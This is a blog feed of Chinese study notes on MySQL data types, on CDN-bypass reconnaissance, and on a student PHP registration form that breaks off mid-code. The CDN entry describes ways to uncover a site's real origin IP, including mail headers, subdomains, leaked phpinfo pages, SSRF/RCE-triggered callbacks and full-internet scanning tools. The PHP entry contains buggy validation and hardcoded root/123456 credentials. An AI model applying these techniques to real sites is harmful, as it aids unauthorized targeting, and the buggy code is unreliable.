class="code"><pre><span class="line">数值类型：</span><br><span class="line">    整型（TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT）</span><br><span class="line">    浮点型（FLOAT, DOUBLE, DECIMAL）。</span><br><span class="line"></span><br><span class="line">日期和时间类型：DATE, TIME, DATETIME, TIMESTAMP, YEAR。</span><br><span class="line">字符串类型：CHAR, VARCHAR, TINYTEXT, TEXT, MEDIUMTEXT, LONGTEXT, BINARY, VARBINARY, TINYBLOB, MEDIUMBLOB, BLOB, LONGBLOB, ENUM, SET。</span><br><span class="line">其他类型：BIT, BOOLEAN, JSON, GEOMETRY, POINT, LINESTRING, POLYGON, MULTIPOINT, MULTILINESTRING, MULTIPOLYGON, GEOMETRYCOLLECTION。</span><br></pre></td></tr></table></figure><h2 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TINYINT: </span><br><span class="line">        有符号的范围为<span class="number">-128</span>到<span class="number">127</span>，      </span><br><span class="line">        无符号的范围为<span class="number">0</span>到<span class="number">255</span>。</span><br><span class="line">        占用<span class="number">1</span>个字节。</span><br><span class="line"></span><br><span class="line"><span class="type">SMALLINT</span>: </span><br><span class="line">        有符号的范围为<span class="number">-32768</span>到<span class="number">32767</span></span><br><span class="line">        无符号的范围为<span class="number">0</span>到<span class="number">65535</span>。</span><br><span class="line">        占用<span class="number">2</span>个字节。</span><br><span class="line"></span><br><span class="line">MEDIUMINT: </span><br><span class="line">        有符号的范围为<span class="number">-8388608</span>到<span class="number">8388607</span></span><br><span class="line">        无符号的范围为<span class="number">0</span>到<span class="number">16777215</span>。</span><br><span class="line">        占用<span class="number">3</span>个字节。</span><br><span class="line"></span><br><span class="line"><span class="type">INT</span>或<span class="type">INTEGER</span>: </span><br><span class="line">        有符号的范围为<span class="number">-2147483648</span>到<span class="number">2147483647</span></span><br><span class="line">        无符号的范围为<span class="number">0</span>到<span class="number">4294967295</span>。</span><br><span class="line">        占用<span class="number">4</span>个字节。</span><br><span class="line"></span><br><span class="line"><span class="type">BIGINT</span>: </span><br><span class="line">        有符号的范围为<span class="number">-9223372036854775808</span>到<span class="number">9223372036854775807</span></span><br><span class="line">        无符号的范围为<span class="number">0</span>到<span class="number">18446744073709551615</span>。</span><br><span class="line">        占用<span class="number">8</span>个字节。</span><br><span class="line"></span><br><span class="line"><span class="type">FLOAT</span>: </span><br><span class="line">        单精度浮点数，精度为大约<span class="number">7</span>位小数。</span><br><span class="line">        占用<span class="number">4</span>个字节。</span><br><span class="line"></span><br><span class="line"><span class="keyword">DOUBLE</span>: </span><br><span class="line">        双精度浮点数，精度为大约<span class="number">15</span>位小数。</span><br><span class="line">        占用<span class="number">8</span>个字节。</span><br><span class="line"></span><br><span class="line"><span class="type">DECIMAL</span>: </span><br><span class="line">        高精度小数，支持存储大数值并保持精度，适用于财务计算等场景。</span><br><span class="line">        <span class="type">DECIMAL</span>(M,D) 表示一个有符号的精度为 M，小数位数为 D 的小数。M 和 D 的最大值为<span class="number">65</span>。</span><br></pre></td></tr></table></figure><h3 id="无符号化-UNSIGNED"><a href="#无符号化-UNSIGNED" class="headerlink" title="无符号化-UNSIGNED"></a>无符号化-UNSIGNED</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> example (</span><br><span class="line">  id <span class="type">INT</span> UNSIGNED, <span class="comment">-- UNSIGNED：无符号化</span></span><br><span class="line">  <span class="keyword">value</span> <span class="type">INT</span>        <span class="comment">-- 正负数都可以。</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> example (</span><br><span class="line">  id <span class="type">INT</span>(<span class="number">5</span>) ZEROFILL <span class="keyword">PRIMARY</span> KEY, <span class="comment">-- ZEROFILL：在整数面前填充数字</span></span><br><span class="line">  name <span class="type">VARCHAR</span>(<span class="number">20</span>)          </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> example (id, name) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;John&#x27;</span>), (<span class="number">10</span>, <span class="string">&#x27;Jane&#x27;</span>), (<span class="number">100</span>, <span class="string">&#x27;Bob&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出如下：</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+</span></span><br><span class="line"><span class="operator">|</span>     id <span class="operator">|</span> name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">00001</span> <span class="operator">|</span> John <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">00010</span> <span class="operator">|</span> Jane <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">00100</span> <span class="operator">|</span> Bob  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+</span></span><br></pre></td></tr></table></figure><h3 id="自动递增和主键约束"><a href="#自动递增和主键约束" class="headerlink" title="自动递增和主键约束"></a>自动递增和主键约束</h3><p>AUTO_INCREMENT 和 PRIMARY_KEY</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">AUTO_INCREMENT 自动递增</span><br><span class="line"></span><br><span class="line">PRIMARY_KEY  主键约束</span><br><span class="line">    主键约束：列值必须是唯一的，不可以重复</span><br><span class="line">            主键列的值不能为空，即主键列不能有 <span class="keyword">NULL</span> 值，因为 <span class="keyword">NULL</span> 不是一个有效的主键值。</span><br><span class="line">            主键列的值必须是唯一的，即不能在表中存在两个或多个主键列的值相同的记录。</span><br><span class="line">            主键列的值不能被更新或删除，因为它们在表中是唯一的标识符。</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除/解除 主键约束/外键关系</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> <span class="keyword">primary</span> key(字段名)</span><br></pre></td></tr></table></figure><h3 id="设置默认值"><a href="#设置默认值" class="headerlink" title="设置默认值"></a>设置默认值</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> person (</span><br><span class="line">    id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">18</span>, <span class="comment">-- 设置默认值为18</span></span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h2><h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> MYSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0019</title>
      <link href="/2023/04/04/SEC-Study-0019/"/>
      <url>/2023/04/04/SEC-Study-0019/</url>
      
        <content type="html"><![CDATA[<p>CDN篇<br>影响的是信息收集。<br>注：不是所有的CDN都可以找到。</p><span id="more"></span><h1 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h1><p>1.传统访问：用户访问域名–&gt;解析服务器IP–&gt;访问目标主机<br>2.普通CDN：用户访问域名–&gt;CDN节点–&gt;真实服务器IP–&gt;访问目标主机<br>3.带WAF的CDN：用户访问域名–&gt;CDN节点（WAF）–&gt;真实服务器IP–&gt;访问目标主机</p><p>国内服务商：</p><blockquote><p>阿里云  百度云  七牛云<br>又拍云 腾讯云  Ucloud<br>360  网宿科技 ChinaCache</p></blockquote><p>国外服务商</p><blockquote><p>CloudFlare StackPath Fastly<br>Akamai CloudFront Edgecast<br>CDNetworks Google Cloud CDN<br>CacheFly Keycdn Udomain CDN77</p></blockquote><h1 id="CDN配置："><a href="#CDN配置：" class="headerlink" title="CDN配置："></a>CDN配置：</h1><p>配置1：加速域名-需要启用加速的域名</p><blockquote><p>子域名获取真实IP<br>指定特定的子域名进行加速<br>子域名和域名IP可能处在同一个网络段或者同一个IP(缩小范围)</p></blockquote><p>配置2：加速区域-需要启用加速的地区</p><blockquote><p>国外访问获取真实IP<br>没有全球加速导致某些冷门区域可以访问到服务器的真实IP地址。</p></blockquote><p>配置3：加速类型-需要启用加速的资源</p><blockquote><p>证书</p></blockquote><h1 id="参考知识："><a href="#参考知识：" class="headerlink" title="参考知识："></a>参考知识：</h1><blockquote><p>超级Ping：<a href="http://www.17ce.com/">http://www.17ce.com/</a><br>超级Ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a><br>接口查询：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>接口查询：<a href="https://fofa.info/extensions/source">https://fofa.info/extensions/source</a><br>国外请求：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>国外请求：<a href="https://boce.aliyun.com/detect/">https://boce.aliyun.com/detect/</a><br>IP社区库：<a href="https://www.cz88.net/geo-public">https://www.cz88.net/geo-public</a><br>全网扫描：<a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a><br>全网扫描：<a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a><br>全网扫描：<a href="https://github.com/Pluto-123/Bypass_cdn">https://github.com/Pluto-123/Bypass_cdn</a></p></blockquote><p>查询的结果要自己判断，不能直接取查询结果。</p><p><a href="https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ">https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ</a><br>常见方法：<br>子域名，邮件系统，国外访问，证书查询，APP抓包，网络空间<br>通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</p><h1 id="前置后置-CDN服务-识别-amp-绑定访问"><a href="#前置后置-CDN服务-识别-amp-绑定访问" class="headerlink" title="前置后置-CDN服务-识别&amp;绑定访问"></a>前置后置-CDN服务-识别&amp;绑定访问</h1><p>超级Ping：<a href="http://17ce.com/">http://17ce.com/</a><br>超级Ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><!-- 老演员：www.sp910.com ,加速了www子域名，没有加速sp910.com--><p>各地ping（出现多个IP即启用CDN服务,IP全部一致表示真实ip无CDN服务）<br>后置：绑定HOST访问解析（参考基础课CDN安全影响）</p><h1 id="某应用-CDN绕过-主动漏洞-amp-遗留文件"><a href="#某应用-CDN绕过-主动漏洞-amp-遗留文件" class="headerlink" title="某应用-CDN绕过-主动漏洞&amp;遗留文件"></a>某应用-CDN绕过-主动漏洞&amp;遗留文件</h1><p>配置加速选项中只加速主域名，导致其他子域名未加速（解析IP可能同IP也可能C段）<br>接口查询：<a href="https://get-site-ip.com/">https://get-site-ip.com</a><br>接口查询：<a href="https://fofa.info/extensions/source">https://fofa.info/extensions/source</a><br>使用网络空间&amp;第三方功能集合查询判断</p><blockquote><p>1、漏洞如：SSRF RCE等<br>利用漏洞让对方真实服务器主动出网连接，判断来源IP即真实IP<br>假设你需要写一个博客站点，博客站点你是登录的，在你写博文时需要远程导入一张图片进行展示，此时，服务器就是主动去寻找图片并且加载的。<br>2、遗留文件：phpinfo类似功能<br>通过访问类似PHPINFO类似代码函数获取本地IP造成的地址泄漏</p><blockquote><p>Server_addr:有内网就是内网IP，没内网就是真实IP。</p></blockquote></blockquote><h1 id="某应用-CDN绕过-邮件系统"><a href="#某应用-CDN绕过-邮件系统" class="headerlink" title="某应用-CDN绕过-邮件系统"></a>某应用-CDN绕过-邮件系统</h1><p>邮件系统记录类型：MX，SRV。</p><p>判断条件：发信人是当前域名邮件用户名</p><ul><li>让他主动给你发：<ul><li>部署架设的邮件服务器如果向外部用户发送邮件的话，</li><li>那么邮件 <strong>头部的源码</strong> 中会包含此邮件服务器的 <strong>真实IP地址</strong> 。</li></ul></li></ul><p>常见的邮件触发点有：</p><blockquote><p>1、RSS订阅<br>2、邮箱注册、激活处<br>3、邮箱找回密码处<br>4、产品更新的邮件推送<br>5、某业务执行后发送的邮件通知<br>6、员工邮箱、邮件管理平台等入口处的忘记密码</p></blockquote><ul><li>你给未知邮箱发：（需要自己的邮件服务器不能第三方）(比如自己搭建一个邮件服务器而不是使用QQ邮箱)<ul><li>通过发送邮件给一个不存在的邮箱地址，因为该用户邮箱不存在，所以发送将失败，</li><li>并且还会收到一个包含发送该电子邮件给你的服务器的真实IP通知。(对方对发送失败返回一个通知且包含真实IP给你)</li></ul></li></ul><h1 id="某应用-CDN绕过-全网扫描"><a href="#某应用-CDN绕过-全网扫描" class="headerlink" title="某应用-CDN绕过-全网扫描"></a>某应用-CDN绕过-全网扫描</h1><blockquote><p>1、判断加速厂商<br>2、IP库筛地址段<br>3、配置范围扫描</p></blockquote><p>先从IP段去扫描符合开放端口，再从IP去访问看看关键字，将符合结果进行保存！<br>厂商查询：<br><a href="https://tools.ipip.net/cdn.php">判断CDN加速厂商</a><br>工具项目：<br>纯真数据库<a href="https://www.cz88.net/geo-public">IP库资源</a><br><a href="https://github.com/Tai7sy/fuckcdn">fuckcdn-master</a></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>fuckcdn<span class="operator">-</span>master:</span><br><span class="line">前提是能实现IP访问</span><br><span class="line">给定IP段，然后扫这个范围IP的所有IP的开放端口</span><br><span class="line"></span><br><span class="line">在ip.txt里面有如下内容：</span><br><span class="line"><span class="number">101.200</span><span class="number">.0</span><span class="number">.0</span>     <span class="number">101.201</span><span class="number">.120</span><span class="number">.255</span></span><br><span class="line">表明这是待会要扫描的IP地址范围</span><br><span class="line"></span><br><span class="line">查找完成后会将疑似真实IP的IP地址放在result_ip.txt</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>Bypass_cdn</span><br><span class="line">弥补fuckcdn的缺陷</span><br></pre></td></tr></table></figure><h1 id="补充：A类B类C类"><a href="#补充：A类B类C类" class="headerlink" title="补充：A类B类C类"></a>补充：A类B类C类</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在TCP/IP协议中，网络地址被划分为A、B、C、D和E五类。其中A、B、C三类为常用网络地址，D和E类则分别用于多点广播和实验。</span><br><span class="line"></span><br><span class="line">这五类网络地址的区别在于网络号和主机号所占的位数不同，以及可容纳的主机数量不同。下面是五类网络地址的具体介绍：</span><br><span class="line"></span><br><span class="line">    A类网络地址：用一个字节（8位）表示网络号，三个字节（24位）表示主机号</span><br><span class="line">      共可容纳2^24-2=16,777,214个主机。</span><br><span class="line">      A类地址的第一位固定为0，因此其网络号范围为1.0.0.0-126.0.0.0。</span><br><span class="line">      其中，1.0.0.0保留不用于分配网络地址，126.0.0.0保留作为一个特殊用途的地址。</span><br><span class="line"></span><br><span class="line">    B类网络地址：用两个字节（16位）表示网络号，两个字节（16位）表示主机号，</span><br><span class="line">      共可容纳2^16-2=65,534个主机。B类地址的前两位固定为10，</span><br><span class="line">      因此其网络号范围为128.0.0.0-191.255.0.0。</span><br><span class="line">      其中，172.16.0.0-172.31.0.0是专门用于局域网的私有地址段，不需要向因特网注册，因此可以自由使用。</span><br><span class="line"></span><br><span class="line">    C类网络地址：用三个字节（24位）表示网络号，一个字节（8位）表示主机号，</span><br><span class="line">      共可容纳2^8-2=254个主机。C类地址的前三位固定为110，</span><br><span class="line">      因此其网络号范围为192.0.0.0-223.255.255.0。</span><br><span class="line">      其中，192.168.0.0-192.168.255.0是专门用于局域网的私有地址段，不需要向因特网注册，因此可以自由使用。</span><br><span class="line"></span><br><span class="line">    D类网络地址：用四个字节（32位）表示，前4位固定为1110，用于多点广播，不分配给具体的主机或路由器使用。</span><br><span class="line">    E类网络地址：用四个字节（32位）表示，前4位固定为1111，保留作为实验和研究使用。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://dns.chacha.cn/">IP反查域名</a>:这个网站不是唯一的，更多的方法自己百度。</p><!-- 支持CDN服务的记录：A记录和CNAME记录->邮件系统没有CDN。邮件系统显示真实IP。形如域名+IP地址的形式。内容有，没有IP+发件人有没有IP 如果不是以他域名为主的邮件系统发送，就得不到真实IP判断条件1.发信邮箱不是当前网站的域名发送的，借贷第三方邮箱发送，与本站没关系，真实IP地址无法抓出来。2.-->]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-Study-016</title>
      <link href="/2023/04/04/PHP-Study-016/"/>
      <url>/2023/04/04/PHP-Study-016/</url>
      
        <content type="html"><![CDATA[<p>今天着实是出了点岔子。这是一道课堂练习题目，目标仅仅是提交表单+验证表单的某些地方是否和规矩。<br>突然脑子想岔了，想实现的是……<br>将表单提交，并且验证表单的可行性，将表单提交到数据库，返回身份令牌/身份凭证，在网页的每一页都调用它。</p><p>为什么这么想？因为有个人突然提了一嘴：期末要交一整个动态网站……</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;表单&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        * &#123;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body &#123;</span><br><span class="line">            background-image: linear-<span class="title function_ invoke__">gradient</span>(to right, #fa709a <span class="number">0</span>%, #fee140 <span class="number">100</span>%);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#top &#123;</span></span><br><span class="line">            height: <span class="number">10</span>px;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h1 &#123;</span><br><span class="line">            margin-bottom: <span class="number">10</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        form &#123;</span><br><span class="line">            width: <span class="number">300</span>px;</span><br><span class="line">            height: <span class="number">290</span>px;</span><br><span class="line">            background-color: red;</span><br><span class="line">            color: <span class="title function_ invoke__">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">            margin: <span class="number">100</span>px auto;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        table &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            margin-left: <span class="number">10</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        table td,</span><br><span class="line">        table &#123;</span><br><span class="line">            border: <span class="number">1</span>px solid transparent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        table tr td:nth-of-<span class="title function_ invoke__">type</span>(<span class="number">2</span>n-<span class="number">1</span>) &#123;</span><br><span class="line">            text-align: right;</span><br><span class="line">            padding-right: <span class="number">10</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        table tr td:nth-of-<span class="title function_ invoke__">type</span>(<span class="number">2</span>n) &#123;</span><br><span class="line">            text-align: left;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#submit &#123;</span></span><br><span class="line">            margin-top: <span class="number">10</span>px;</span><br><span class="line">            width: <span class="number">100</span>px;</span><br><span class="line">            height: <span class="number">2</span>em;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;sqldata.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;div id=<span class="string">&quot;top&quot;</span>&gt; &lt;/div&gt;</span><br><span class="line">        &lt;h1&gt;用户注册页面&lt;/h1&gt;</span><br><span class="line">        &lt;table&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;用户名:&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;密码:&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;字母数字下划线&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;用户类型:&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;</span><br><span class="line">                    &lt;select id=<span class="string">&quot;gender&quot;</span> name=<span class="string">&quot;user_type&quot;</span> required&gt;</span><br><span class="line">                        &lt;option value=<span class="string">&quot;0&quot;</span>&gt;学生&lt;/option&gt;</span><br><span class="line">                        &lt;option value=<span class="string">&quot;1&quot;</span>&gt;教师&lt;/option&gt;</span><br><span class="line">                        &lt;option value=<span class="string">&quot;2&quot;</span>&gt;管理员&lt;/option&gt;</span><br><span class="line">                    &lt;/select&gt;</span><br><span class="line">                &lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;邮箱:&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type=<span class="string">&quot;email&quot;</span> name=<span class="string">&quot;email&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;身份证:&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;user_id&quot;</span> placeholder=<span class="string">&quot;必须是18位数字&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;手机号码:&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;mobile_number&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;用户地址:&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;user_addr&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;注册&quot;</span> name=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$verify</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_type</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_type&#x27;</span>];</span><br><span class="line">            <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">            <span class="variable">$mobile_number</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mobile_number&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_addr</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_addr&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&quot;&quot;</span>) | <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">3</span>) | <span class="variable">$username</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="variable">$str</span> .= <span class="string">&#x27;用户名不能空且长度必须大于3！&#x27;</span>;</span><br><span class="line">                <span class="variable">$verify</span> = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[0-9]*/&#x27;</span>, <span class="variable">$password</span>  &lt; <span class="number">1</span>) &amp; <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z]*/&#x27;</span>, <span class="variable">$password</span>) &lt; <span class="number">1</span> | <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &gt; <span class="number">16</span> | <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">3</span> | <span class="title function_ invoke__">preg_grep</span>(<span class="string">&#x27;/[^0-9a-zA-Z]/&#x27;</span>, <span class="variable">$password</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable">$str</span> .= <span class="string">&quot;密码必须是字母数字组合且长度必须在8到16之间！&quot;</span>;</span><br><span class="line">                <span class="variable">$verify</span> = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[@\.]/&#x27;</span>, <span class="variable">$email</span>) &lt; <span class="number">1</span> | <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[@\.]/&#x27;</span>, <span class="variable">$email</span>) &gt; <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="variable">$str</span> .= <span class="string">&quot;电子邮件格式输入错误!&quot;</span>;</span><br><span class="line">                <span class="variable">$verify</span> = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$user_id</span>) != <span class="number">18</span>) &#123;</span><br><span class="line">                <span class="variable">$str</span> .= <span class="string">&quot;身份证号码必须等于18位!&quot;</span>;</span><br><span class="line">                <span class="variable">$verify</span> = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$mobile_number</span>) != <span class="number">11</span>) &#123;</span><br><span class="line">                <span class="variable">$str</span> .= <span class="string">&quot;电话号码必须等于11位！&quot;</span>;</span><br><span class="line">                <span class="variable">$verify</span> = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$verify</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable">$flag</span> = -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27; 注册失败&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;&quot;</span> . <span class="variable">$str</span> . <span class="string">&quot;\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;注册成功&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;mydatabase&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 这里写入数据库</span></span><br><span class="line">                <span class="variable">$tableName</span> = 